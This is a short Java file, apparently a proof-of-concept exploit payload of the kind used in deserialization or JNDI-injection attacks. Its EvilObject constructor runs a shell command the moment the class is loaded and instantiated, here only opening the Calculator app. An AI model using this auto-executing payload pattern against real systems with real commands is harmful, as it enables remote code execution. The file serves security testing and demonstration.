import java.lang.Runtime;
import java.lang.Process;

public class EvilObject {
    public EvilObject() throws Exception {
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
//        Runtime rt = Runtime.getRuntime();
//        String[] commands = {"\"/bin/sh\", \"-c\", \"open /Applications/Calculator.app\""};
//        Process pc = rt.exec(commands);
//        pc.waitFor();
    }
}